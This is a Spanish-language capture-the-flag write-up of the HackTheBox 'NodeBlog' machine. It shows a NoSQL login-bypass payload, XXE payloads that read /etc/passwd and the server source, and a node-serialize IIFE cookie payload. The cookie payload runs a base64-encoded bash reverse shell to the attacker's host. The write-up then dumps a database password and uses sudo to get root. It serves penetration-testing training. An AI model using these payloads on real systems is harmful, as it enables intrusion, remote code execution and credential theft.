---
title: NodeBlog Writeup - HackTheBox
date: 2023-07-18
categories: [Writeups, HTB]
tags: [Linux, HTB, CTF, Easy, XXE, NoSQL Injection, NodeJS Deserialization, IIFE, SUDO, MongoDB]
img_path: /assets/img/commons/nodeblog/
image: nodeblog.png
---
¡Saludos!

En este writeup, nos adentraremos en la máquina [**NodeBlog**](https://app.hackthebox.com/machines/NodeBlog) de **HackTheBox**, clasificada con un nivel de dificultad fácil según la plataforma. Se trata de una máquina **Linux** en la que realizaremos **enumeración web** e identificaremos **inyecciones NoSQL** que nos permitirán descubrir la ruta del código fuente de la aplicación web y eludir la autenticación de un panel de login.

Una vez dentro del panel, exploraremos la posibilidad de **inyecciones XXE** que nos permitirán enumerar rutas del sistema, incluyendo el código fuente de la aplicación web. Allí, identificaremos la presencia de métodos de **serialización** y **deserialización** que pueden ser explotados mediante **NodeJS Deserialization (IIFE Abusing)**. Esta explotación nos permitirá ejecutar código arbitrario y obtener acceso al sistema víctima.

Una vez hayamos ganado acceso, identificaremos que **MongoDB** se está ejecutando localmente y enumeraremos la base de datos para encontrar la contraseña del usuario que nos permitirá verificar los privilegios **sudo** del usuario. Al obtener la capacidad de ejecutar comandos en la máquina con privilegios de root, podremos cambiar fácilmente al usuario root.

¡Vamos a empezar!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.11.139
PING 10.10.11.139 (10.10.11.139) 56(84) bytes of data.
64 bytes from 10.10.11.139: icmp_seq=1 ttl=63 time=112 ms

--- 10.10.11.139 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 111.761/111.761/111.761/0.000 ms
```

Dado que el `TTL` es cercano a 64, podemos inferir que la máquina objetivo probablemente sea Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.11.139 -oG allPorts.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 18:04 -05
Nmap scan report for 10.10.11.139
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 15.22 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p 22,5000 -sV --min-rate 5000 10.10.11.139 -oN services.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 18:08 -05
Nmap scan report for 10.10.11.139
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Node.js (Express middleware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.86 seconds
```

El reporte indica que en la máquina objetivo se encuentran activos un servicio **SSH** (`OpenSSH 8.2p1`) en el puerto por defecto, junto con una aplicación web `NodeJS` que corre en el puerto `5000`. Esta aplicación web utiliza el **framework Express** para construir el sitio web.

### HTTP - 5000

En la enumeración del servicio web que corre en el puerto `5000`, descubrimos un sitio de Blogs.

![web](web.png)

Una vez dentro del sitio de Blogs, al hacer clic en "`Read More`" se accede al blog completo, mientras que al seleccionar "`Login`" se accede a un formulario de inicio de sesión.

![login](login.png)

Al realizar el intento de ingresar credenciales comunes por defecto, como "`admin:admin`", hemos constatado que el usuario "`admin`" está registrado en la base de datos. Esto se debió a que el sitio nos devolvió el mensaje de error "`Invalid Password`" (Contraseña inválida) en lugar de "`Invalid Username`" (Nombre de usuario inválido).

![admin_user](admin_user.png)

## Explotación

---

### NoSQL Injection

Después de verificar si el formulario es vulnerable a una **inyección SQL** (`SQLi`) y no tener éxito con las cargas útiles comunes, decidimos avanzar con un ataque más complejo: la comprobación de inyecciones `NoSQL`.

Comenzamos capturando una petición POST utilizando `BurpSuite` y enviamos la petición al **Repeater** pulsando `Ctrl+r` . Por defecto, la página se envía como un formulario HTML, tal y como indica la cabecera `Content-Type` de la petición.

![request](request.png)

Nos basamos en un amplio repositorio de [payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass) para eludir la autenticación `NoSQL` e intentamos inyectar nuestro payload de la siguiente manera: `user=admin&password[$ne]=admin`.

Enviamos la petición pero obtenemos una respuesta inválida.

![nosql](nosql.png)

A continuación, procedimos a establecer la cabecera "`Content-Type`" en `JSON` y a modificar la carga útil. Al hacer esto, notamos que al enviar un cuerpo `JSON` no válido, obtenemos cierta información sobre la estructura de directorios subyacente de la aplicación:

![nosql_json](nosql_json.png)

Gracias a los errores devueltos, hemos identificado que el código del servidor se encuentra en `/opt/blog/`, lo cual podría ser útil en el futuro. Posteriormente, intentamos inyectar nuestra carga `NoSQL` nuevamente, pero esta vez con un formato `JSON` correcto: `{"user": "admin", "password": {"$ne": "admin"}}`.

![nosql_json2](nosql_json2.png)

Después de realizar la inyección con éxito, obtuvimos una cookie de autenticación válida. Al verificar que el objetivo es vulnerable, inyectamos nuevamente el mismo payload y reenviamos la petición al navegador para obtener una sesión válida. La petición completa tiene el siguiente aspecto:

```bash
POST /login HTTP/1.1
Host: 10.10.11.139:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 25
Origin: http://10.10.11.139:5000
Connection: close
Referer: http://10.10.11.139:5000/login
Upgrade-Insecure-Requests: 1

{"user": "admin", "password": {"$ne": "admin"}}
```

Al regresar a la página principal, notamos la adición de algunos botones con nuevas funcionalidades.

![access_login](access_login.png)

El botón "`Upload`" es de suma importancia, ya que nos permite cargar archivos en el servidor. Al hacerlo, aparece el siguiente mensaje:

![xml](xml.png)

Al realizar una inspección del código fuente del mensaje de error, se revela que el servidor está esperando un archivo en formato `XML`.

```bash
Invalid XML Example: <post><title>Example Post</title><description>Example Description</description><markdown>Example Markdown</markdown></post>
```

Así que procedemos a crear un archivo en formato `XML`, asegurándonos de respetar el formato del ejemplo proporcionado.

```xml
<post>
  <title>Test Post</title>
  <description>Testing...</description>
  <markdown>
    Example Markdown
  </markdown>
</post>
```

Al cargar el archivo, se nos redirige al siguiente formulario.

![edit_article](edit_article.png)

### XXE Injection

Dado que el sitio claramente acepta `XML`, analiza los datos enviados y los muestra de nuevo, esto crea una oportunidad para realizar un XML External Entity (`XXE`).

En esta etapa, hay varios [payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe) que podríamos probar. Primero, intentamos leer el archivo `/etc/passwd`:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

<post>
  <title>Test Post</title>
  <description>Testing...</description>
  <markdown>&xxe;</markdown>
</post>
```

> 1. La línea `<!ENTITY xxe SYSTEM "file:///etc/passwd" >` declara una entidad `XML` llamada `xxe`, que se asocia con el archivo ubicado en `/etc/passwd` en el sistema.
> 2. La parte `&xxe;` invoca el archivo de entidad declarado. Cuando un analizador `XML` vulnerable procesa este `XML`, intenta sustituir `&xxe;` por el contenido del archivo `/etc/passwd`.
{: .prompt-tip }

Después de enviar el payload, podemos observar el contenido del archivo `/etc/passwd` de la máquina de destino.

![passwd](passwd.png)

Luego, verificamos si se trata de un contenedor o no, inspeccionando el archivo `/proc/net/fib_trie`.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///proc/net/fib_trie" >]>

<post>
  <title>Test Post</title>
  <description>Testing...</description>
  <markdown>&xxe;</markdown>
</post>
```

Encontramos la dirección IP de la máquina objetivo, pero no hay direcciones IP disponibles dentro de la subred `172.17.0.0/16` para asignar a los contenedores.

![fib_trie](fib_trie.png)

Esto quiere decir que, si logramos comprometer la web, obtendremos acceso directamente a la máquina víctima y no a un contenedor.

Después de eso, procedemos a realizar una enumeración de los puertos internos del sistema víctima inspeccionando el archivo `/proc/net/tcp`.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///proc/net/tcp" >]>

<post>
  <title>Test Post</title>
  <description>Testing...</description>
  <markdown>&xxe;</markdown>
</post>
```

Copiamos el siguiente resultado y lo pegamos en un archivo de nombre "data".

![ports](ports.png)

Para extraer únicamente los puertos en hexadecimal y luego convertirlos a decimal, ejecutamos el siguiente comando en la terminal:

`for port in $(cat data | awk '{print $2}' | grep -v local | awk 'NF{print $NF}' FS=':' | sort -u); do echo "[+] Port $port -> $(echo "obase=10; ibase=16; $port"| bc)"; done`

```bash
❯ for port in $(cat data | awk '{print $2}' | grep -v local | awk 'NF{print $NF}' FS=':' | sort -u); do echo "[+] Port $port -> $(echo "obase=10; ibase=16; $port"| bc)"; done
[+] Port 0016 -> 22
[+] Port 0035 -> 53
[+] Port 6989 -> 27017
[+] Port D4F2 -> 54514
[+] Port D4F4 -> 54516
[+] Port D4F6 -> 54518
```

Del resultado, se puede observar que se está utilizando el puerto 27017, el cual hace referencia al puerto por defecto que usa `MongoDB`.

Ahora que sabemos que el código fuente de la aplicación web está en el directorio `/opt/blog/`, podemos intentar leer el código fuente para obtener más pistas. Para ello, actualizamos nuestro payload para que apunte al archivo `/opt/blog/server.js`, ya que este archivo es comúnmente utilizado para aplicaciones `NodeJS`.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///opt/blog/server.js" >]>

<post>
  <title>Test Post</title>
  <description>Testing...</description>
  <markdown>&xxe;</markdown>
</post>
```

### NodeJS Deserialization (IIFE Abusing)

Es importante destacar la importación de "`node-serialize`" y la posterior llamada al método "`unserialize()`" dentro de la función "`authenticated()`" en la cookie "`c`" de una solicitud.

![server](server.png)

![server2](server2.png)

Hemos revisado la cookie y parece ser JSON codificado con `URL-encoding`.

![cookie](cookie.png)

La cookie decodifica a:

`{"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}`

Podemos explotar la llamada a `unserialize()` al pasar un objeto `JavaScript` serializado y malicioso a la función. Esto incluiría una expresión de Immediately invoked function expression (`IIFE`) que permitirá la ejecución de código arbitrario.

Para comprender cómo funciona esta explotación, se sugiere consultar el artículo: [Exploiting Node.js deserialization bug for Remote Code Execution | OpSecX](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/). En dicho artículo, se explica detalladamente el proceso, y es la base de los payloads que se presentan a continuación.

Utilizamos el siguiente objeto `JSON` serializado:

```bash
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ping -c 1 10.10.14.210', function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```

Ahora, codificamos este objeto `JSON` en nuestra cookie utilizando `URL-encoding`.

`%7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%20%28%29%7b%5c%6e%20%5c%74%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%70%69%6e%67%20%2d%63%20%31%20%31%30%2e%31%30%2e%31%34%2e%32%31%30%27%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%20%7b%20%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%20%7d%29%3b%5c%6e%20%7d%28%29%22%7d`

> El payload actual consiste en un simple comando "`ping`", que podemos usar en conjunto con "`tcpdump`" en nuestra máquina local para verificar si nuestro ataque funciona.
{: .prompt-tip }

Por último, configuramos `tcpdump` para que escuche en la interfaz `tun0` los paquetes `ICMP` recibidos por un ping exitoso .

```bash
❯ tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

A continuación, actualizamos nuestra cookie con el valor codificado anteriormente y recargamos la página web desde la raíz.

![cookie2](cookie2.png)

Podemos observar que los paquetes se reciben correctamente, lo que significa que podemos ejecutar código arbitrario en la máquina de destino.

```bash
❯ tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:11:30.945533 IP 10.10.11.139 > 10.10.14.210: ICMP echo request, id 1, seq 1, length 64
23:11:30.945549 IP 10.10.14.210 > 10.10.11.139: ICMP echo reply, id 1, seq 1, length 64
23:11:57.101634 IP 10.10.11.139 > 10.10.14.210: ICMP echo request, id 2, seq 1, length 64
23:11:57.101645 IP 10.10.14.210 > 10.10.11.139: ICMP echo reply, id 2, seq 1, length 64
23:12:03.724264 IP 10.10.11.139 > 10.10.14.210: ICMP echo request, id 3, seq 1, length 64
23:12:03.724287 IP 10.10.14.210 > 10.10.11.139: ICMP echo reply, id 3, seq 1, length 64
```

Una vez confirmada la ejecución del código, actualizamos nuestro payload para obtener una reverse shell. En este caso, un simple payload codificado en Base64 funciona adecuadamente:

```bash
❯ echo 'bash -i >& /dev/tcp/10.10.14.210/443 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTAvNDQzIDA+JjEK
```

Agregamos la salida del comando anterior a nuestro objeto `JSON` serializado de esta forma: "`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTAvNDQzIDA+JjEK | base64 -d | bash`". De esta manera, se decodifica y ejecuta con bash.

```bash
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTAvNDQzIDA+JjEK | base64 -d | bash', function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```

Codificamos nuevamente este objeto `JSON` en nuestra cookie utilizando `URL-encoding`.

`%7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%20%28%29%7b%5c%6e%20%5c%74%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%65%63%68%6f%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%79%4d%54%41%76%4e%44%51%7a%49%44%41%2b%4a%6a%45%4b%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%27%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%20%7b%20%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%20%7d%29%3b%5c%6e%20%7d%28%29%22%7d`

Por último, configuramos una escucha `Netcat` en el puerto `4444`, enviamos la cookie como antes y esperamos la reverse shell: 

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.210] from (UNKNOWN) [10.10.11.139] 50262
bash: cannot set terminal process group (858): Inappropriate ioctl for device
bash: no job control in this shell
admin@nodeblog:/opt/blog$ whoami
whoami
admin
```

Como vemos hemos obtenido con éxito una shell como `admin`, ahora podemos seguir los pasos de "[Tratamiento de la TTY](https://itzjp-sec.github.io/posts/tratamiento-tty/)" para obtener una shell más interactiva y funcional. 

Es curioso que, a pesar de no tener acceso a nuestro directorio personal en `/home/admin`, tengamos la propiedad del directorio, lo que nos permite cambiar sus permisos y, por lo tanto, extraer la flag.

```bash
admin@nodeblog:~$ cd /home/admin/
bash: cd: /home/admin/: Permission denied
admin@nodeblog:~$ ls -l /home/
total 0
drw-r--r-- 1 admin admin 232 Jul 19 08:44 admin
admin@nodeblog:~$ chmod +x /home/admin
admin@nodeblog:~$ cat /home/admin/user.txt
fae575919af*********************
```

## Escalación de privilegios

---

La enumeración del sistema de destino revela que efectivamente `MongoDB` se estaba ejecutando en su puerto predeterminado.

```bash
admin@nodeblog:~$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      2 10.10.11.139:50262      10.10.14.210:443        ESTABLISHED
tcp        0      0 127.0.0.1:54518         127.0.0.1:27017         ESTABLISHED
tcp        0      0 127.0.0.1:54516         127.0.0.1:27017         ESTABLISHED
tcp        0      0 10.10.11.139:52274      10.10.16.4:4444         ESTABLISHED
tcp        0      0 127.0.0.1:27017         127.0.0.1:54514         ESTABLISHED
tcp        0      0 127.0.0.1:54514         127.0.0.1:27017         ESTABLISHED
tcp        0      0 127.0.0.1:27017         127.0.0.1:54518         ESTABLISHED
tcp        0      0 127.0.0.1:27017         127.0.0.1:54516         ESTABLISHED
tcp6       0      0 :::5000                 :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN
```

Podemos conectarnos a la instancia utilizando la utilidad de línea de comandos "`mongo`”.

```bash
admin@nodeblog:~$ mongo
MongoDB shell version v3.6.8
connecting to: mongodb://127.0.0.1:27017
Implicit session: session { "id" : UUID("ef79d705-a8df-4bb9-8386-966b0c2a2dbb") }
MongoDB server version: 3.6.8
Server has startup warnings: 
2023-07-18T10:48:12.437+0000 I CONTROL  [initandlisten] 
2023-07-18T10:48:12.437+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2023-07-18T10:48:12.437+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2023-07-18T10:48:12.437+0000 I CONTROL  [initandlisten]
```

Ejecutando el comando `show dbs`, podemos listar las bases de datos existentes.

```bash
> show dbs
admin   0.000GB
blog    0.000GB
config  0.000GB
local   0.000GB
```

La única base de datos que no es predeterminada es "`blog`", por lo que procedemos a realizar su enumeración.

```bash
> use blog
switched to db blog
> show collections
articles
users
```

Hemos encontrado dos colecciones, y la última de ellas es la de `users`, lo cual es de interés, ya que podría contener credenciales. Procedemos a volcar su contenido para obtener más información.

```bash
> db.users.find()
{ "_id" : ObjectId("61b7380ae5814df6030d2373"), "createdAt" : ISODate("2021-12-13T12:09:46.009Z"), "username" : "admin", "password" : "IppsecSaysPleaseSubscribe", "__v" : 0 }
```

La contraseña "`IppsecSaysPleaseSubscribe`" ha sido revelada. Intentamos utilizarla para nuestra cuenta de usuario y comprobamos los privilegios sudo del usuario "`admin`".

```bash
admin@nodeblog:~$ sudo -l 
[sudo] password for admin:
Matching Defaults entries for admin on nodeblog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on nodeblog:
    (ALL) ALL
    (ALL : ALL) ALL
```

Al utilizar la contraseña, nos percatamos de que tenemos la capacidad de ejecutar cada uno de los comandos en la máquina con privilegios de `root`. Por consiguiente, procedemos a cambiar al usuario `root`.

```bash
admin@nodeblog:~$ sudo su
root@nodeblog:/home/admin# whoami
root
```

Finalmente, accedemos al directorio `/root/` y conseguimos la última flag de la máquina.

```bash
root@nodeblog:/home/admin# cd /root/
root@nodeblog:~# cat root.txt 
f17ff8d2522*********************
```

!Happy Hacking¡
